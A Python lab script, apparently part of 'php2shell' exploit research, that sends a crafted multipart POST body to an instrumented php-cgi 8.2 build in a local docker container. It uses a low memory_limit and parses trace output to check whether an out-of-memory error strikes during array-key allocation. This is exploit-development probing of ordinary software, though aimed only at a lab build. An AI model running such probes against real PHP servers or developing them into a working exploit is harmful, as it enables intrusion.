#!/usr/bin/env python3
"""php2shell lab, oom27b: unique-segment keys, small memory_limit.

Instrument read: str-variant commit fires per DISTINCT segment (subtree
bucket), leaf keys are interned. So each key part gets a UNIQUE ~4KB
segment -> one post-commit ~4KB key alloc per part, the biggest ask in
the tail. memory_limit=16M (our ini) brings the wall into a 6MB body.
"""
import subprocess, re, sys

BIN = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"
LIMIT = sys.argv[1] if len(sys.argv) > 1 else "16M"
KEYLEN = int(sys.argv[2]) if len(sys.argv) > 2 else 4000

def part_value(name, val):
    return (b'--BOUND\r\nContent-Disposition: form-data; name="' + name + b'"\r\n\r\n'
            + val + b"\r\n")

def part_seg(i, seglen):
    # unique long segment + [x] leaf: one str-commit w/ inline key alloc of seglen
    seg = b"p" + b"K" * (seglen - 2) + (b"%d" % i)
    return (b'--BOUND\r\nContent-Disposition: form-data; name="' + seg + b'[x]"\r\n\r\nv\r\n')

def build():
    ps = []
    for i in range(24):
        ps.append(part_value(b"f%d" % i, b"V" * 250_000))
    for v in (100_000, 50_000, 20_000, 10_000, 5_000, 2_000):
        ps.append(part_value(b"t%d" % v, b"W" * v))
    for i in range(8):
        ps.append(part_seg(i, KEYLEN))
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def send(body):
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "%s -d memory_limit=%s -d post_max_size=4096M -d max_input_vars=100000 "
           "2>/tmp/e.log >/tmp/o.log; echo RC=$?" % (len(body), BIN, LIMIT))
    subprocess.run(["docker", "exec", "-i", "phpbuild", "sh", "-c", cmd],
                   input=body, capture_output=True, timeout=120)
    out = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                          "cat /tmp/e.log /tmp/o.log"], capture_output=True).stdout.decode("latin1")
    return out

def analyze(trace):
    fatal = "Allowed memory size" in trace
    commits = re.findall(r"TRACE keycommit stage=(\d+) elem=(\d+) free=(\d+)", trace)
    oks = len(re.findall(r"TRACE keyok", trace))
    seg_commits = [c for c in commits if c[0] == "5"]
    last_commit = commits[-1] if commits else None
    key_death = fatal and len(commits) > oks
    allocs = re.findall(r"TRACE alloc size=(\d+) real=\d+ free=(\d+)", trace)
    return dict(fatal=fatal, ncommits=len(commits), nseg=len(seg_commits), oks=oks,
                key_death=key_death, last_commit=last_commit,
                last_alloc=allocs[-1] if allocs else None)

def main():
    body = build()
    print("oom27b limit=%s keylen=%d body=%d" % (LIMIT, KEYLEN, len(body)), flush=True)
    trace = send(body)
    r = analyze(trace)
    print("fatal=%s commits=%s seg_commits=%s oks=%s KEY_DEATH=%s" % (
        r["fatal"], r["ncommits"], r["nseg"], r["oks"], r["key_death"]), flush=True)
    print("last_commit:", r["last_commit"], flush=True)
    print("last_alloc:", r["last_alloc"], flush=True)
    lines = [l for l in trace.splitlines()
             if "keycommit" in l or "keyok" in l or "Allowed memory" in l or "PROBE" in l]
    print("--- key tail ---", flush=True)
    for l in lines[-10:]:
        print(" ", l, flush=True)

if __name__ == "__main__":
    main()
